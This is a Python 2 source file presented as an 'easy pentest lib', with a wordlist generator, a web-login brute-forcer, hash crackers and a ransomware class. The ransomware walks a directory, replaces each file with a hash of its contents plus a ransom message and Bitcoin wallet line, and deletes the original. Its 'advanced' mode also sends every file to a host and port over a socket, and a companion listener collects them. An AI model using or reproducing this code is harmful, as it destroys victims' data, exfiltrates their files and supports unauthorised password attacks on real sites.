""" Easy pentest lib """

# Wordlist generator
# Bruteforce sample sites
# Advanced hash cracking
# Ransomware creating

"""
	@Author : Daniel Victor Freire Feitosa
	@Version : 1.0.5
	<danielfreire56@hotmail.com>


 Lib focada em facilitar o desenvolvimento de programas com foco em pentesting e seguranca ofensiva
construida no Windows 10 pro, otimizacoes sao bem vistas e de grande valia.

	# Futures Modules And Updates
		[Module Payloads creating] - v2.0.0
		[Module Batsploit] - v2.1.5
		[Module Metasploit] - v2.5.0
		[Exceptions add] - v2.9.0
"""
# IO Classes

class wordlist():
	def __init__(self, wd_name, wd_min_length, wd_max_length, wd_chars):
		self.wd_name = wd_name
		self.wd_min_length = wd_min_length
		self.wd_max_length = wd_max_length
		self.wd_chars = wd_chars
	def create(self):
		from itertools import product
		file = open(self.wd_name, "w")
		for i in xrange(self.wd_min_length, self.wd_max_length+1):
			for xs in product(self.wd_chars, repeat=i):
				string=''.join(xs)
				file.write(string+"\n")
		file.close()
		return 0

class bruteforce():
	def __init__(self, url, uname, login_param, pwd_param, fail_msg, wordlist):
		self.url = url
		self.uname = uname
		self.login_param = login_param
		self.pwd_param = pwd_param
		self.fail_msg = fail_msg
		self.wordlist = wordlist
	def start(self):
		from requests import post
		from sys import exit
		wd_file = open(self.wordlist, "r")
		for i in wd_file:
			pwd = i.strip()
			data = {self.login_param : self.uname, self.pwd_param : pwd}
			r=post(self.url, data=data)
			if self.fail_msg in r.content:
				print "[ATTEMP] %s:%s"%(self.uname, pwd)
			else:
				print "\n[BRUTEFORCE SUCCESS] %s:%s\n"%(self.uname, pwd)
				exit()
		wd_file.close()

class hashcrack():
	def __init__(self, raw_hash, type_hash, min_length=0, max_length=0, chars=None, wordlist=None, wordlists=None):
		self.raw_hash = raw_hash
		self.min_length = min_length
		self.max_length = max_length
		self.type_hash = type_hash
		self.chars = chars
		self.wordlist = wordlist
		self.wordlists = wordlists

	def cartesian_crack(self):
		from itertools import product
		from sys import exit
		if self.type_hash == "md5":
			from hashlib import md5
		elif self.type_hash == "sha1":
			from hashlib import sha1
		elif self.type_hash == "sha512":
			from hashlib import sha512
		elif self.type_hash == "sha224":
			from hashlib import sha224
		elif self.type_hash == "sha256":
			from hashlib import sha256
		elif self.type_hash == "sha384":
			from hashlib import sha384

		for n in xrange(self.min_length, self.max_length+1):
			for xs in product(self.chars, repeat=n):
				string=''.join(xs)

				if self.type_hash == "md5":
					hashed_string = md5(string).hexdigest()
				elif self.type_hash == "sha1":
					hashed_string = sha1(string).hexdigest()
				elif self.type_hash == "sha512":
					hashed_string = sha512(string).hexdigest()
				elif self.type_hash == "sha224":
					hashed_string = sha224(string).hexdigest()
				elif self.type_hash == "sha256":
					hashed_string = sha256(string).hexdigest()
				elif self.type_hash == "sha384":
					hashed_string = sha384(string).hexdigest()

				if self.raw_hash == hashed_string:
					print "\n[CRACKED HASH] %s:%s\n"%(hashed_string, string)
					exit()
				else:
					print "[ATTEMP] %s:%s"%(self.raw_hash, string)
	def wordlist_crack(self):
		from sys import exit
		if self.type_hash == "md5":
			from hashlib import md5
		elif self.type_hash == "sha1":
			from hashlib import sha1
		elif self.type_hash == "sha512":
			from hashlib import sha512
		elif self.type_hash == "sha224":
			from hashlib import sha224
		elif self.type_hash == "sha256":
			from hashlib import sha256
		elif self.type_hash == "sha384":
			from hashlib import sha384

		file_list = open(self.wordlist, "r")
		for i in file_list:
			string = i.strip()

			if self.type_hash == "md5":
				hashed_string = md5(string).hexdigest()
			elif self.type_hash == "sha1":
				hashed_string = sha1(string).hexdigest()
			elif self.type_hash == "sha512":
				hashed_string = sha512(string).hexdigest()
			elif self.type_hash == "sha224":
				hashed_string = sha224(string).hexdigest()
			elif self.type_hash == "sha256":
				hashed_string = sha256(string).hexdigest()
			elif self.type_hash == "sha384":
				hashed_string = sha384(string).hexdigest()

			if self.raw_hash == hashed_string:
				print "\n[CRACKED HASH] %s:%s\n"%(hashed_string, string)
				exit()
			else:
				print "[ATTEMP] %s:%s"%(self.raw_hash, string)
	def wordlist_cartesian_crack(self):
		from threading import Thread as thread
		crack = hashcrack(self.raw_hash, self.type_hash, self.min_length, self.max_length, self.chars, self.wordlist)
		thread(target=crack.cartesian_crack()).start()
		thread(target=crack.wordlist_crack()).start()
	def multiple_wordlits_cartesian_crack(self):
		from threading import Thread as thread
		crack = hashcrack(self.raw_hash, self.type_hash, self.min_length, self.max_length, self.chars)
		for wd in self.wordlists:
			thread(target=hashcrack(self.raw_hash, self.type_hash, 0, 0, None, wd).wordlist_crack()).start()
		thread(target=crack.cartesian_crack()).start()

class ransomware():
	def __init__(self, path, msg, host=None, port=0, btc_wallet=None):
		self.path = path
		self.msg = msg
		self.host = host
		self.port = port
		self.btc_wallet = btc_wallet
	def simple(self):
		from os import walk, remove
		from platform import system
		from hashlib import sha512
		for paths,dirs,files in walk(self.path):
			for file in files:
				if system() == "Windows":
					flag = paths+"\\"+file
				else:
					flag = paths+"/"+file
				print "Encrypt : %s"%(flag)
				handle = open(flag, "rb")
				try:
					read = handle.read()
				except MemoryError:
					read = "Out of memory - @hacked by ProXy"
				if self.btc_wallet == None:
					encrypt = "%s (4098 bits) : %s"%(self.msg, sha512(read).hexdigest())
				else:
					encrypt = "%s (4098 bits) : %s\n\nBTC Wallet : %s\n"%(self.msg, sha512(read).hexdigest(), self.btc_wallet)
				new_file_name = flag.split(".")[0]+".encrypted"
				try:
					encrypt_handle = open(new_file_name, "wb")
					encrypt_handle.write(encrypt)
				except IOError:
					print "Error to write new files in %s"%(new_file_name)
					exit()
				encrypt_handle.close()
				handle.close()
				remove(flag)
	def send_files(self, path, read):
		from platform import system
		from socket import socket, AF_INET, SOCK_STREAM
		if system() == "Windows":
			only_name = "decrypted-"+path.split("\\")[len(path.split("\\")) - 1] # name of file
		else:
			only_name = "decrypted-"+path.split("/")[len(path.split("/")) - 1] # name of file
		# creating socket and sending files
		try:
			s=socket(AF_INET, SOCK_STREAM)
			s.connect((self.host, self.port))
			s.send(only_name)
			data = s.recv(1024)
			s.send(read)
			data = s.recv(1024)
			# close all handles and sockets
			s.close()
		except error:
			return 1
	def advanced(self):
		from os import walk, remove
		from platform import system
		from hashlib import sha512
		for paths,dirs,files in walk(self.path):
			for file in files:
				if system() == "Windows":
					flag = paths+"\\"+file
				else:
					flag = paths+"/"+file
				print "Encrypt : %s"%(flag)
				handle = open(flag, "rb")
				try:
					read = handle.read()
				except MemoryError:
					read = "Out of memory - @hacked by ProXy"
				ransomware(0, self.msg, self.host, self.port).send_files(flag, read)
				if self.btc_wallet == None:
					encrypt = "%s (4098 bits) : %s"%(self.msg, sha512(read).hexdigest())
				else:
					encrypt = "%s (4098 bits) : %s\n\nBTC Wallet : %s\n"%(self.msg, sha512(read).hexdigest(), self.btc_wallet)
				new_file_name = flag.split(".")[0]+".encrypted"
				try:
					encrypt_handle = open(new_file_name, "wb")
					encrypt_handle.write(encrypt)
				except IOError:
					print "Error to write new files in %s"%(new_file_name)
					exit()
				encrypt_handle.close()
				handle.close()
				remove(flag)
	def listen_files(self, listen_connections=1, path_to_save=None):
		from socket import socket, AF_INET, SOCK_STREAM, error
		try:
			s = socket(AF_INET, SOCK_STREAM)
			s.bind((self.host, self.port))
			s.listen(listen_connections)
			print "Listening files addr %s:%i\n"%(self.host, self.port)
			while 1:
				sock, addr = s.accept()
				data = sock.recv(1024)
				if not data: break
				if "decrypted-" in data:
					if path_to_save == None:
						print "File recevied %s:%i / Saved %s"%(addr[0], addr[1], data)
					else:
						print "File recevied %s:%i\n Saved %s"%(addr[0], addr[1], path_to_save+"/"+data)
					sock.send(data)
					if path_to_save == None:
						file = open(data, "wb")
					else:
						file = open(path_to_save+"/"+data, "wb")
					file.write(sock.recv(1024))
					file.close()
				sock.send(data)
				sock.close()
			s.close()
		except error:
			return 1

# End IO Classes
